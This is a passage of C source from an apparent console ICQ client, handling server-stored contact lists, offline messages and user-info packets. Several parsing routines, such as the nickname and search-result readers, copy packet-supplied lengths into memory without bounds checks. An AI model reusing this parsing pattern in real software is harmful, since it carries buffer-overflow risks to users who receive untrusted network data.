        YSM_SendSNAC( 0x13,
                0x11,
                0x0,
                0x0,
                NULL,
                0,
                g_sinfo.seqnum++, reqid);
}

void
YSM_BuddyRequestFinished(void)
{
char reqid[4];

        memset(reqid,0,4);
        reqid[3] = 0x12;


        YSM_SendSNAC( 0x13,
                0x12,
                0x0,
                0x0,
                NULL,
                0,
                g_sinfo.seqnum++, reqid);

}

void
YSM_BuddyAck( FLAP_Head *head, SNAC_Head thesnac, char *buf )
{
        YSM_SendSNAC( 0x13,
                0x07,
                0x0,
                0x0,
                NULL,
                0,
                g_sinfo.seqnum++, NULL);
}


/* This function goes through the list of slaves that have */
/* the downloaded flag on, searching for the biggest budID */
/* once it finds it, it increments the id by 1 and returns */

static int YSM_BuddyGenNewID(void)
{
	unsigned int    x;
	int        newid = 0;
	slave_t    *rotating = (slave_t *) g_slave_list.start;

    for ( x = 0; x < g_slave_list.length; x++ )
    {
        if(rotating != NULL)
        {
            if(rotating->BudType.BudID > newid)
                newid = rotating->BudType.BudID;

            rotating = (slave_t *) rotating->suc;
        }
    }

    newid++;

    return newid;
}

/*
 hehe nice function huh :) well use is this way:

    For adding a Group:
        Item = 0x0, grpName = groupname
        grpID = groupID, budID = 0x0, type = YSM_BUDDY_GROUP
    For adding a Buddy:
        Iteme= slave_t*, grpName = groupname
        grpID = groupID, budID = UIN(int), type = YSM_BUDDY_SLAVE

    the function returns the buddy ID.
*/

/* YSM_BuddyAddItem
 *    if CMD == 0, then ADD ITEM
 *    if CMD == 1, then NOTIFY MASTER
 *
 *    if add_update == 0x08 then ADD
 *    if add_update == 0x0a then REMOVE
 *
 *    bID holds a buddy ID. if bID == 0, GENERATE ID
 */

int32_t
YSM_BuddyAddItem( slave_t    *item,
        int8_t        *grpname,
        u_int32_t    grpid,
        u_int32_t    bID,
        u_int32_t    type,
        u_int32_t    cmd,
        u_int32_t    authawait,
        u_int32_t    add_update)
{
u_int32_t    dlen = 0, tsize = 0;
int8_t        *data = NULL, *data2 = NULL;
int8_t        grp_len[2], item_type[2], YSMBuddyGroup_ID[2];
int8_t        YSMBuddy_ID[2], sUIN[MAX_UIN_LEN+1];
int8_t        **data_list = NULL, *data_list_tmp = NULL, *name = NULL;
int32_t        *data_list_amount = NULL, budID = 0;
int8_t        reqid[4];

    if (item == NULL || grpname == NULL)
        return -1;

    /* We increment the change count on our buddy list for future chgs */
    g_sinfo.blentries++;

    YSM_BuddyRequestModify();

    if (type == YSM_BUDDY_GROUP)    {
        /* for notifying master */
        data_list = &g_sinfo.blgroupsid;
        data_list_amount = &g_sinfo.blgroupsidentries;
        name = grpname;

    } else {
        memset(sUIN, 0, sizeof(sUIN));
        snprintf(sUIN, MAX_UIN_LEN, "%d", (int)item->uin);
        sUIN[sizeof(sUIN)-1] = 0x00;

        name = &sUIN[0];

        /* for notifying master */
        data_list = &g_sinfo.blusersid;
        data_list_amount = &g_sinfo.blusersidentries;
    }

    Word_2_Charsb(grp_len, strlen(name));
    Word_2_Charsb(YSMBuddyGroup_ID, grpid);

    /* We are creating this buddy for the first time, dont
      * generate a new random ID for already created ids  */
    if(type != YSM_BUDDY_GROUP) {

        /* bID is a param to this function
         * usually used for invisible, visible and ignore
         */

        if (!bID) {
            if(add_update == 0x08) {
                budID = YSM_BuddyGenNewID();
                item->BudType.BudID = budID;
            }
            else
                budID = item->BudType.BudID;
        }
        else
            budID = bID;
    }


    /* Just used if adding a Buddy */
    Word_2_Charsb(YSMBuddy_ID, budID);

    switch(cmd)
    {
        case 0:        /* Called first time, add items */
        {

        dlen = 2; /* len WORD */
        dlen += strlen(name);

        dlen += 2 + 2; /* Group ID and Buddy ID */
        dlen += 2;    /* Type 0x0001 is Group */
        dlen += 2;    /* Extra len */

        if ( type != YSM_BUDDY_GROUP ) {
            dlen += sizeof(TLV) + strlen(item->info.NickName);
            if(authawait) dlen += sizeof(TLV);
        }

        data = ysm_calloc(1, dlen, __FILE__, __LINE__);
        if (data == NULL) {
            return 0;
        }

        memcpy(data+tsize,&grp_len,2);
        tsize += 2;
        memcpy(data+tsize,name,strlen(name));
        tsize += strlen(name);

        memcpy(data+tsize,YSMBuddyGroup_ID,2);
        tsize += 2;

        switch(type)
        {
            case YSM_BUDDY_GROUP:
                tsize += 2;     /* grp buddy ids are 0 */
                break;
            default:        /* Adding a Buddy */
                memcpy(data+tsize,&YSMBuddy_ID,2);
                tsize += 2;
                break;
        }

        Word_2_Charsb(item_type,type);
        memcpy(data+tsize,&item_type,2);
        tsize += 2;

        memset(reqid,0,4);

        reqid[1] = g_sinfo.blentries;
        reqid[3] = add_update;

        if( type == YSM_BUDDY_GROUP )
            memcpy(&g_sinfo.blysmgroupid,reqid,4);

        else        /* which would be YSM_BUDDY_SLAVE or..etc */
        {
            /* And now if we are adding a Buddy add on
                    Extra Data its Nickname */

            /* re using grp_len for xtra_len */
            if(!authawait)
                Word_2_Charsb(grp_len,
                    strlen(item->info.NickName)+sizeof(TLV));
            else
                Word_2_Charsb(grp_len,
                strlen(item->info.NickName)+sizeof(TLV)+sizeof(TLV));


            memcpy(data+tsize,&grp_len,2);    /* Xtra len */
            tsize += 2;
            data2 = ysm_malloc( sizeof(TLV) + strlen(item->info.NickName),
                    __FILE__,
                    __LINE__ );

            if (data2 == NULL) {
                ysm_free( data, __FILE__, __LINE__ );
                data = NULL;
                return 0;
            }

            InsertTLV(item->info.NickName,0x131,data2,
                        strlen(item->info.NickName));

            memcpy(data+tsize,data2,
                     strlen(item->info.NickName)+sizeof(TLV));

            tsize += strlen(item->info.NickName) + sizeof(TLV);
            ysm_free(data2, __FILE__, __LINE__);
            data2 = NULL;

            if (authawait)
                InsertTLV(0,0x66,data+tsize,0);

            /* fill the slave's reqid, so we then know whos who */
            memcpy(&item->ReqID,reqid,4);
        }


        YSM_SendSNAC( 0x13,
                add_update,
                0x0,
                0x0,
                data,
                dlen,
                g_sinfo.seqnum++, reqid);


        ysm_free(data, __FILE__, __LINE__);
        data = NULL;
        break;

        }

    case 0x1:
        {

        /* Generating change on Master Group */
        /* Either Master group of groups or Group of Buddys! */


        /*len(word) + string (0 bytes if GROUP or GrpName if BUDDY)*/
        dlen = 2;

        if(type != YSM_BUDDY_GROUP) dlen += strlen(grpname);
        dlen += 2 + 2; /* Group ID and Buddy ID */
        dlen += 2;    /* Type 0x0001 is Group */
        dlen += 2;    /* Extra len (just leave 0, should do) */
        /* TLV containing all groups */
        (*data_list_amount)++;    /* New GroupID ! */
        dlen += sizeof(TLV) + (*data_list_amount)*2;

        data = ysm_calloc(1, dlen, __FILE__, __LINE__);
        if (data == NULL) return 0;

        tsize = 0;

        switch(type)
        {
            case YSM_BUDDY_GROUP:        /* Group! */
                tsize += 2;    /* len == 0 */
                tsize += 2;    /* GrpID == 0, Master Group! */
                tsize += 2;    /* Buddy ID == 0, Im a group! */
                break;

            default:            /* Buddy! */
                Word_2_Charsb(grp_len, strlen(grpname));
                memcpy(data+tsize,&grp_len,2);
                tsize += 2;
                memcpy(data+tsize, grpname, strlen(grpname));
                tsize += strlen(grpname);
                memcpy(data+tsize,YSMBuddyGroup_ID,2);
                tsize += 2;
                tsize += 2;
                break;



        }

        /*    For Both, a new Group or Buddy, the
            type must be 0001 since what we are
            changing here is in both cases a group        */

        Word_2_Charsb(item_type,0x0001);
        memcpy(data+tsize,&item_type,2);    /* Type == 0x0001 */
        tsize += 2;


        /* re using grp_len for xtra_len */
        Word_2_Charsb(grp_len, ((*data_list_amount))*2+sizeof(TLV));

        memcpy(data+tsize,&grp_len,2);    /* Xtra len */
        tsize += 2;

        data2 = ysm_malloc( ((*data_list_amount)*2)+sizeof(TLV),
                    __FILE__,
                    __LINE__);

        if (data2 == NULL) {
            ysm_free( data, __FILE__, __LINE__ );
            data = NULL;
            return 0;
        }

        /* replacing an old realloc call */
        data_list_tmp =  ysm_malloc( (*data_list_amount) * 2,
                    __FILE__,
                    __LINE__ );

        if (data_list_tmp == NULL) {
            ysm_free( data, __FILE__, __LINE__ );
            data = NULL;
            ysm_free( data2, __FILE__, __LINE__ );
            data2 = NULL;
            return 0;
        }

        if (*data_list != NULL) {
            memcpy( data_list_tmp,
                *data_list,
                ((*data_list_amount)-1)*2);

            ysm_free( *data_list, __FILE__, __LINE__ );
            *data_list = NULL;
        }

        (*data_list) = data_list_tmp;

        /* end of replacement */

        memset(reqid,0,4);
        reqid[1] = g_sinfo.blentries;
        reqid[3] = add_update;


        /* add the new Group id if adding a group
                or user id if adding a user */

        if( type == YSM_BUDDY_GROUP )
            memcpy((*data_list)+((*(data_list_amount)-1)*2),
                         &YSMBuddyGroup_ID, 2);
        else
        {
            memcpy((*data_list)+((*(data_list_amount)-1)*2),
                         &YSMBuddy_ID, 2);
            /* fill the slave's reqid, so we then know whos who */
            memcpy(&item->ReqID,reqid,4);

        }

        InsertTLV((*data_list),0xc8,data2, *(data_list_amount)*2);
        memcpy(data+tsize,data2, (*(data_list_amount)*2)+sizeof(TLV));

        ysm_free(data2, __FILE__, __LINE__);
        data2 = NULL;

        YSM_SendSNAC( 0x13,
                add_update,
                0x0,
                0x0,
                data,
                dlen,
                g_sinfo.seqnum++, reqid);

        ysm_free(data, __FILE__, __LINE__);
        data = NULL;

        break;
        }

        default:
            YSM_ERROR(ERROR_CODE, 1);
            break;

    }

    return budID;

}


static void
YSM_BuddyCreateGroup(void)
{
    /*    We initialized the Amount variable to -1, if the group
        existed while we read the Buddy List but it was empty,
        we sat 0x0 as its value. (which means no need to create) */

    if (g_sinfo.blusersidentries < 0) {
        PRINTF(VERBOSE_MOATA,
            "CREATING YSM Group, doesn't exist!..\n");

        YSM_BuddyAddItem(0x0,
                YSM_BUDDY_GROUPNAME,
                YSM_BUDDY_GROUPID,
                0x0,
                YSM_BUDDY_GROUP,
                0,
                0,
                0x08);

        g_sinfo.blusersidentries = 0;
    }
}


void YSM_BuddyUploadList(slave_t *refugee)
{
	slave_t *SlavesList = (slave_t *) g_slave_list.start;
	int i=0, count=0;

    YSM_BuddyCreateGroup();

    PRINTF(VERBOSE_BASE, "Please wait..\n");

    if (refugee != NULL) {
        if(!refugee->DownloadedFlag) {
            YSM_BuddyAddItem( refugee,
                    YSM_BUDDY_GROUPNAME,
                    YSM_BUDDY_GROUPID,
                    0x0,
                    YSM_BUDDY_SLAVE,
                    0,
                    0,
                    0x08);
        } else
            PRINTF(VERBOSE_BASE,
                "The slave is already stored online.\n");

        return;
    }


    for ( i = 1; SlavesList != NULL; i++) {
        if (count >= MAX_SAVE_COUNT)
            break;

        if (!SlavesList->DownloadedFlag) {
            YSM_BuddyAddItem( SlavesList,
                YSM_BUDDY_GROUPNAME,
                YSM_BUDDY_GROUPID,
                0x0,
                YSM_BUDDY_SLAVE,
                0x0,
                0x0,
                0x08);

            count++;
        }

        SlavesList = (slave_t *) SlavesList->suc;
    }

    PRINTF(VERBOSE_BASE,
        "Please wait until %d results show up (or the few left).\n",
                             MAX_SAVE_COUNT);
    PRINTF(VERBOSE_BASE,
        "Use 'save' again to upload the missing slaves"
        " in groups of %d.\n", MAX_SAVE_COUNT);

    if(!count)
        PRINTF(VERBOSE_BASE,
            "-- done with ALL SLAVES" ".\n"
             "Use the 'req' command for those who require auth.\n");
}


int YSM_BuddyReadSlave(char *buf, int tsize)
{
    int size=0,ulen=0,nlen=0;
    char *uin=0,*nick=0,Nlen[2],xtralen[2],xtratlvtype[2];
    char budID[2], grpID[2], budtype[2];

    /* actually its a word, but its always the first byte (a len)*/
    size++;
    ulen = buf[tsize+size];
    if (ulen <= 0 || ulen > MAX_UIN_LEN)
        return 0x666;
    size++;

    uin = YSM_CALLOC(1, ulen+1);
    memcpy(uin,&buf[tsize+size],ulen);
    size += ulen;

    /* Group ID */
    memcpy(&grpID, &buf[tsize+size], 2);
    size += 2;
    /* Buddy ID */
    memcpy(&budID, &buf[tsize+size], 2);
    size += 2;
    /* There are different types of buddies */
    /* Some maybe be on our ignore list, some on our invisible list, etc */
    memcpy(&budtype, &buf[tsize+size], 2);
    size += 2;

    memset(&xtralen,0,2);
    memset(&xtratlvtype,0,2);
    memcpy(&xtralen,buf+size+tsize,2);

    /* We just care about the 0x131 which is the Nick of our slave. */
    /* 0x66 and other tlvs are ignored, why would we want em huh HUH =P */

    size += 2;

    if (Chars_2_Wordb(xtralen) != 0)
    {
        memcpy(&xtratlvtype,buf+size+tsize,2);

        switch (Chars_2_Wordb(xtratlvtype))
        {
            /* Which means Extra Data Nick Incoming! */
            case 0x131:
                    size += 2;
                    memcpy(&Nlen,buf+size+tsize,2);
                    size += 2;
                    nlen = Chars_2_Wordb(Nlen);
                    nick = YSM_CALLOC(1, nlen+1);
                    memcpy(nick, &buf[tsize+size],nlen);
                    size += Chars_2_Wordb(xtralen) - 4;
                    break;

            case 0x66:    /* Awaiting auth from this slave */
                    size += Chars_2_Wordb(xtralen);
                    break;

            default:
            /* Fine, no Nick found then */
                    size += Chars_2_Wordb(xtralen);
                    break;
        }
    }

    if (nlen != 0)
    {
        YSM_CharsetConvertString(&nick, CHARSET_INCOMING, MFLAGTYPE_UTF8, TRUE);
        if ((nlen = YSM_ParseSlave(nick)) == 0)
        {
            YSM_FREE(nick);
        }
    }

    if (!nlen)
    {
        /* God Damn! No nick for this slave! What shall we use?! */
        /* Fine god dammit! Lets use its UIN # as his nickname! */

        nlen = strlen(uin);
        nick = YSM_CALLOC(1, nlen+1);
        memcpy(nick, uin, nlen);
    }


/*    debugging info  */
    PRINTF(VERBOSE_SDOWNLOAD,"\nADDING %s with %s\n",nick,uin);

    /* Last param , 1 == ONLINE slave (Stored on the srv) */
    YSM_BuddyAddSlave(nick, uin, budID, grpID, budtype, 1);

    YSM_FREE(uin);
    YSM_FREE(nick);

    return size;
}

void
YSM_BuddyIncomingChange( FLAP_Head *head, SNAC_Head thesnac, char *buf )
{
	slave_t *SlavesList = (slave_t *) g_slave_list.start;
	char incomingreq[2];
	int i = 0;

    if (g_slave_list.start == NULL)
        return;

    memcpy(&incomingreq,buf,2);

    /* Maybe its the ack for our group creation..*/
    /* If so.. */
    if(thesnac.ReqID == g_sinfo.blysmgroupid)
    {
        YSM_BuddyAddItem( 0x0,
                YSM_BUDDY_GROUPNAME,
                YSM_BUDDY_GROUPID,
                0x0,
                YSM_BUDDY_GROUP,
                1,
                0,
                0x09);

        PRINTF(VERBOSE_MOATA,"\n" MSG_BUDDY_GROUPCREATED "\n");

        /* Let it know it can close the contact list */
        YSM_BuddyRequestFinished();

        return;
    }


    for (i = 1; SlavesList != NULL; i++)
	{
        if (thesnac.ReqID == SlavesList->ReqID)
		{
            /* If its the Group added ack, just break */
                if(SlavesList->DownloadedFlag == TRUE)
                        break;

            switch(Chars_2_Wordb(incomingreq))
			{
            case YSM_SRV_BUDDY_NOAUTH:

            /* Ok! Been acked. Notify the YSM group that
            it's got a new user. */


                PRINTF(VERBOSE_BASE,
                "\n" MSG_BUDDY_SAVING1 "%s"
                         MSG_BUDDY_SAVING2 "%d"
                         MSG_BUDDY_SAVING3,
                            SlavesList->info.NickName,
                            SlavesList->uin);

                YSM_BuddyAddItem( SlavesList,
                        YSM_BUDDY_GROUPNAME,
                        YSM_BUDDY_GROUPID,
                        0x0, /* new */
                        YSM_BUDDY_SLAVE, 1, 0, 0x09);


            /* Set the -online- contact flag so we can then
                know who required auth and who did not */

                PRINTF(VERBOSE_BASE,
                MSG_BUDDY_SAVINGOK  "\n" );

                SlavesList->DownloadedFlag = TRUE;

                break;

            case YSM_SRV_BUDDY_AUTH:
            /* This slave requires an online auth..ugh. */

            /* Let the user know he needs auth from the
                other part in order to add it in the list */

            PRINTF(VERBOSE_BASE,
            "\n" MSG_BUDDY_SAVING1 "%s"
                     MSG_BUDDY_SAVING2 "%d"
                     MSG_BUDDY_SAVING3,
                        SlavesList->info.NickName,
                        SlavesList->uin);


            PRINTF(VERBOSE_BASE,
                MSG_BUDDY_SAVINGAUTH "\n" 
                MSG_BUDDY_SAVINGAUTH2
                MSG_BUDDY_SAVINGAUTH3 "\n");

            SlavesList->DownloadedFlag = 0x0a;

            break;

            case YSM_SRV_BUDDY_ERRADD:

            PRINTF(VERBOSE_BASE,
                MSG_BUDDY_SAVINGERROR "\n" 
                MSG_BUDDY_SAVINGERROR2 );

                SlavesList->DownloadedFlag = TRUE;

                break;

            /*    Shouldn't happend. Take same action as if
                a reply for a non-slave arrives, ignore! */

            default:
            /*
                Bleh, don't let the user know about this ;P

                PRINTF(VERBOSE_BASE,
                 " [WARNING]\n" 
                "Try Again!.\n");

                Just retry.
            */
            PRINTF(VERBOSE_MOATA, "\nDijo WARNING\n");

                    YSM_BuddyAddItem( SlavesList,
                        YSM_BUDDY_GROUPNAME,
                        YSM_BUDDY_GROUPID,
                        0x0, /* new */
                        YSM_BUDDY_SLAVE,
                         0, 0, 0x08);
                break;
            }

        /* Let it know it can close the contact list */
        YSM_BuddyRequestFinished ();

        }

        SlavesList = (slave_t *) SlavesList->suc;
    }
}

void YSM_BuddyIncomingList(
    FLAP_Head *head,
    SNAC_Head  thesnac,
    char      *buf,
    int        buf_len)
{
int8_t    groupid[2], grouptype[2], d_len[2], g_id[2], chgcount[2];
int32_t    tsize = 0, len = 0, len2 = 0, GrpSlaves = 0, y = 0;
int32_t    r = 0, maxdlen = 0, g_amount = 0;
TLV    thetlv;

    memset(&thetlv,'\0',sizeof(TLV));
    tsize++; /* SSI protocol version (!?) */

    /* Amount of modifications by now (We need this for future mods) */
    memcpy(chgcount, buf+tsize, 2);
    g_sinfo.blentries = Chars_2_Wordb(chgcount);
    tsize+=2;

    /* For future changes, we mark our next change already */
    g_sinfo.blentries++;

    /* If there is now a 6 0 bytes field, then.. */
    /* (Usually comes with the first Roaster */

    if(!buf[tsize] && !buf[tsize+1] && !buf[tsize+2] &&
            !buf[tsize+3] && !buf[tsize+4] && !buf[tsize+5])
    {
        tsize += 6;

/* there is this first TLV(1) which we DONT want, so we will just */
/* skip its header and jump to its data where the tlv (c8) is (only one), */
/* then we read the len of the c8 tlv and begin from there. */

/* we still store its length in case theres a new TLV in it we dont know */
/* but we still have to skip its content */

        memcpy(&thetlv,buf+tsize,sizeof(TLV));
        len2 = Chars_2_Wordb(thetlv.len);
        tsize += sizeof(TLV);
    }

    g_sinfo.flags |= FL_DOWNLOADEDSLAVES;
    maxdlen = buf_len - SNAC_HEAD_SIZE;

    while (0 != len2)
    {
        memset(&thetlv,'\0',sizeof(TLV));
        memcpy(&thetlv,buf+tsize,sizeof(TLV));
        len = Chars_2_Wordb(thetlv.len);

        /* The Groups listing did show up, skip it! dammit! */
        if(Chars_2_Wordb(thetlv.type) == 0xc8) {

            /*    Make a global allocated area where to store
                the existing GroupIDS */

                tsize += sizeof(TLV);

                g_sinfo.blgroupsid = YSM_CALLOC(1, len);
                g_sinfo.blgroupsidentries = len/2;

                for(y=0;y<len;y+=2)
                    memcpy(g_sinfo.blgroupsid+y,&buf[tsize+y],2);

                tsize += len;

        }
        else
            tsize += (len + sizeof(TLV));

        /* this should set len2 to 0..if theres no more data */
        len2 -= (sizeof(TLV) + len);
    }

    /* DAMN! Parse the items and get to the GROUPS! */
    while( (tsize+4) < maxdlen )
    {
        memcpy(&d_len,buf+tsize,2);
        tsize += 2;
        y = Chars_2_Wordb(d_len);
        if (tsize+y >= maxdlen) break;
        tsize += y;
        memcpy(g_id,buf+tsize,2);
        tsize += 2;    /* Group ID */

        /* Lets check if its a group what we found
        by copying the UserID (should be 0) and the type */
        memcpy(&groupid,buf+tsize,2);
        memcpy(&grouptype, buf+tsize+2, 2);

        if(!groupid[0] && !groupid[1] &&
            !grouptype[0] && grouptype[1] == 1)
        {
            tsize += 4;

            /* We are now standing on the len of the
            following data */
            memcpy(&d_len,buf+tsize,2);
            tsize += 2;

            if(Chars_2_Wordb(d_len) == 0)
            {
                /* Empty group, but check if its is
                OUR group so we dont make the mistake
                of creating it twice! */
                if(Chars_2_Wordb(g_id) == YSM_BUDDY_GROUPID)
                {
                    g_sinfo.blusersidentries = 0;
                }

                continue;
            }

            memcpy(&thetlv,buf+tsize,sizeof(TLV));
            len = Chars_2_Wordb(thetlv.len);
            tsize += sizeof(TLV);

            switch(Chars_2_Wordb(thetlv.type))
            {
                /* Users ID */
                /* Use the amm of IDS for knowing the amm */
                /* of slaves in the group */
                case 0xc8:
                {

            /* If its the YSM Group, we need the list of Buddy */
            /* Ids stored in our users list. */
                if(Chars_2_Wordb(g_id) == YSM_BUDDY_GROUPID)
                {
                    if(len != 0)
                    {
                    g_sinfo.blusersid = ysm_calloc(1,
                                len,
                                __FILE__,
                                __LINE__);

                    g_sinfo.blusersidentries = len/2;

                    for(y=0;y<len;y+=2)
                        memcpy(g_sinfo.blusersid+y,
                            &buf[tsize+y],2);
                    }
                    else
                    {
                    /* The Group exists, but its empty.
                        Do NOT re-create the group! */
                        g_sinfo.blusersidentries = 0;
                    }
                }

                    GrpSlaves = len/2;
                    g_amount += GrpSlaves;
                    tsize += len;
                    break;
                }

                default:
                    GrpSlaves = 0;
                    tsize += len;
                    break;
            }

            for (y=0; y<GrpSlaves;y++)
            {
                r = YSM_BuddyReadSlave(buf,tsize);
                if (r == 0x666 || (tsize + r) >= maxdlen)
                    break;

                else tsize +=r;

                PRINTF(VERBOSE_SDOWNLOAD,"%d",tsize);
            }

        }
        else
        {
            /* If it wasn't a group, it might be a slave */
            /* in a special status (visible, invisible, ignore) */
            /* or without a group, yes its possible fuckn srv */

            if( Chars_2_Wordb(grouptype) == YSM_BUDDY_SLAVE_INV
            || Chars_2_Wordb(grouptype) == YSM_BUDDY_SLAVE_IGN
            || Chars_2_Wordb(grouptype) == YSM_BUDDY_SLAVE_VIS)
            {
                /* Make ReadSlave point to the beginning
                    of the block            */

                YSM_BuddyReadSlave(buf,
                    (tsize-2-Chars_2_Wordb(d_len)-2));

            }    /* Check if its our Privacy Settings */

            else if (Chars_2_Wordb(grouptype) == 0x0004) {
                g_sinfo.blprivacygroupid = Chars_2_Wordb(groupid);

                /* Check the current setting. */
                /* If we left invisible, change the status */
                /* to invisible again. */
                /* If we WANT invisible, turn to invisible 2 */
                if(buf[tsize+4+2+sizeof(TLV)] == 0x2
                || buf[tsize+4+2+sizeof(TLV)] == 0x3
                || YSM_USER.status == STATUS_INVISIBLE)
                {
                    YSM_ChangeStatus(STATUS_INVISIBLE);
                }

            } else {
                /* A slave outside a group */
                /* Make ReadSlave point to the beginning
                    of the block            */

                YSM_BuddyReadSlave(buf,
                    (tsize-2-Chars_2_Wordb(d_len)-2));
            }

        tsize += 4;    /* User ID and Type */

        /* See if theres any Xtra data on this item */

        memcpy(&d_len,buf+tsize,2);
        tsize += 2;

        if(Chars_2_Wordb(d_len) != 0)
            tsize += Chars_2_Wordb(d_len);
        }

    }

/* Print some shocking message :) New slaves are always welcome. */
#ifndef COMPACT_DISPLAY
    PRINTF(VERBOSE_BASE,
        "\nd[O_o]b %d %s\n",g_amount,MSG_DOWNLOADED_SLAVES);
#endif

    g_promptstatus.flags |= FL_RAW;

    YSM_BuddyAck( head, thesnac, buf );
}


void
YSM_IncomingMultiUse( FLAP_Head *head, SNAC_Head *thesnac, char *buf )
{
int32_t        tsize = 0;
uin_t        uin = 0;
int8_t        BytesRem[2], Type[2], ReqID[2], SubID[2], result;
int8_t        m_flags, r_uin[MAX_UIN_LEN+1], m_type = 0;
int8_t        o_month = 0, o_day = 0, o_hour = 0, o_minutes = 0;
u_int8_t    m_len[2];
slave_t    *victim = NULL;

    /* its a TLV(1) at the very beggining, always. */
    tsize += 4;
    memcpy(&BytesRem,buf+tsize,2);
    tsize += 2;
    /* my UIN */
    tsize += 4;
    memcpy(&Type,buf+tsize,2);
    tsize += 2;
    memcpy(&ReqID,buf+tsize,2);
    tsize += 2;

    switch(Chars_2_Wordb(Type)) {
        /* Information request response */
        case 0xda07:
            memcpy(&SubID,buf+tsize,2);
            tsize += 2;
            result = buf[tsize];
            if (result != 0x32 && result != 0x14 && result != 0x1E )
            {
                switch(Chars_2_Wordb(SubID)) {

                    /* Incoming MAIN info */
                    case 0xC800:

                    YSM_IncomingInfo( INFO_MAIN,
                            buf,
                            tsize+1,
                            thesnac->ReqID );
                    break;

                    /* incoming full info */
                    case 0xDC00:

                    YSM_IncomingInfo( INFO_HP,
                            buf,
                            tsize+1,
                            thesnac->ReqID );
                    break;

                    case 0xD200:

                    YSM_IncomingInfo( INFO_WORK,
                            buf,
                            tsize+1,
                            thesnac->ReqID );

                    break;

                    case 0xE600:

                    YSM_IncomingInfo( INFO_ABOUT,
                            buf,
                            tsize+1,
                            thesnac->ReqID );

                    break;

                    case 0xA401:
                    case 0xAE01:
                    tsize++;
                    YSM_IncomingSearch(buf, tsize);
                    break;

                    case 0x6400:

                    PRINTF( VERBOSE_BASE,
                        "\r"
                        MSG_INFO_UPDATED "\n" );
                    break;

                    case 0xAA00:
                    PRINTF( VERBOSE_BASE,
                        "\rPassword changed.\n");
                    break;

                    default:
                        break;
                }
            }

            break;

        case 0x4100:
            memcpy(&uin,buf+tsize,4);
            snprintf(r_uin, MAX_UIN_LEN, "%d", (int)uin);
            r_uin[sizeof(r_uin) - 1] = 0x00;
            tsize+=4;

            tsize += 2; /* WORD (year) */
            o_month = buf[tsize];
            tsize++;  /* Month */
            o_day = buf[tsize];
            tsize++; /* Day */
            o_hour = buf[tsize];
            tsize++; /* Hour */
            o_minutes = buf[tsize];
            tsize++; /* Minutes */
            m_type = buf[tsize];
            tsize++;
            m_flags = buf[tsize];
            tsize++;
            memcpy(&m_len, buf+tsize, 2);
            tsize+=2;

            victim = YSM_QuerySlaves(SLAVE_UIN, NULL, uin, 0);

            PRINTF( VERBOSE_BASE,
                "\n" MSG_NEW_OFFLINE "\n"
                "[date: %.2d/%.2d time: %.2d:%.2d (GMT):\n",
                o_day,
                o_month,
                o_hour,
                o_minutes);

            /* offline message */
            YSM_ReceiveMessageData( victim,
                    r_uin,
                    0,
                    m_type,
                    0x00,
                    Chars_2_Word(m_len),
                    buf+tsize );

            YSM_AckOffline();
            break;

        case 0x4200:        /* end of offline msgs */
            break;

        default:

            break;
    }

    g_promptstatus.flags |= FL_RAW;
}

void YSM_IncomingSearch(char *buf, int tsize)
{
    char   Len[2];
    char  *data = NULL;
    int    len2 = 0;
    uin_t  ruin = 0;

    tsize += 2;    /* record LEN */
    memcpy(&ruin, buf+tsize, 4);
    tsize += 4;

    memcpy(&Len, buf+tsize, 2);
    tsize += 2;
    len2 = Chars_2_Word(Len);
    data = ysm_calloc(1, len2+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, len2);

    PRINTF(VERBOSE_BASE, "\nUIN: %d", ruin);
    PRINTF(VERBOSE_BASE, "\tNick: %s\n", data);

    ysm_free(data, __FILE__, __LINE__);
}


void
YSM_IncomingPersonal( FLAP_Head *head, SNAC_Head *thesnac, int8_t *buf )
{
int32_t    x = 0, len = 0;
int8_t    *aux = NULL;

    /* uin len */
    len = buf[0];
    x++;

    x += len;
    x += 4;

    while (x < (Chars_2_Wordb(head->dlen) - SNAC_HEAD_SIZE)) {

        /* buf should point to the TLV type field. */
        switch(Chars_2_Wordb( buf+x )) {

        case 0x3:

            len = Chars_2_Wordb(buf+x+2);
            /* time_t */
            if (len == 0x4)    {
                aux = (int8_t *)&YSM_USER.timing.Signon;
                aux[0] = buf[x+7];
                aux[1] = buf[x+6];
                aux[2] = buf[x+5];
                aux[3] = buf[x+4];
            }

             /* just cheat and quit */
            x = Chars_2_Wordb( head->dlen ) - SNAC_HEAD_SIZE;
            break;

        case 0x0a:
            /* get our external ip address */
            memcpy( &YSM_USER.d_con.rIP_ext, buf+x+4, 4 );
        default:
            /* buf + 2 should contain the TLV len data field. */
            x += Chars_2_Wordb( buf+x+2 );
            x += sizeof( TLV );
            break;

        }

    }

    YSM_USER.delta = YSM_USER.timing.Signon - time(NULL);
    if (YSM_USER.delta < 0)
        YSM_USER.delta = 0;
}

void
YSM_IncomingInfo( char type, char *buf, int tsize, unsigned int reqid )
{

slave_t    *YSM_Query;
char        *pnick = NULL, *pfirst = NULL, *plast = NULL, *pemail = NULL;
uin_t        *puin = NULL;

    /* Incoming is for ourselves? */
    if (reqid == (YSM_USER.Uin & 0xffffff7f)) {
        pnick = &YSM_USER.info.NickName[0];
        pfirst = &YSM_USER.info.FirstName[0];
        plast = &YSM_USER.info.LastName[0];
        pemail = &YSM_USER.info.email[0];

    } else {

        YSM_Query = YSM_QuerySlaves( SLAVE_REQID,
                    NULL,
                    0,
                    reqid );

        if ( YSM_Query ) {
            pnick = &YSM_Query->info.NickName[0];
            puin = &YSM_Query->uin;
        }
    }

    switch (type) {
        case INFO_MAIN:
            if ( reqid == (YSM_USER.Uin & 0xffffff7f) )
            {    /* disimulamos el primer query */
                PRINTF( VERBOSE_BASE,
                    "\r""ACCOUNT INFORMATION:"
                    "\n");
            }

            YSM_IncomingMainInfo( buf,
                    tsize,
                    pnick,
                    pfirst,
                    plast,
                    pemail,
                    reqid,
                    puin);
            break;

        case INFO_HP:
            YSM_IncomingHPInfo(buf, tsize);
            break;

        case INFO_WORK:
#if 0
            /* we disabled work info since we decided
             * it is a waste of screen space to display it
             */
            YSM_IncomingWorkInfo(buf, tsize);
#endif
            break;

        case INFO_ABOUT:
            YSM_IncomingAboutInfo(buf, tsize);
            break;

        default:
            break;
    }


}

void YSM_IncomingMainInfo(
    int8_t    *buf,
    int32_t    tsize,
    int8_t    *pnick,
    int8_t    *pfirst,
    int8_t    *plast,
    int8_t    *pemail,
    u_int32_t  reqid,
    uin_t     *puin)
{
    int8_t    *data = NULL, local = 0;
    int32_t    nlen = 0;

    if (buf == NULL)
        return;

    /* local is true if its ours */
    if (reqid == (YSM_USER.Uin & 0xffffff7f))
        local = 1;

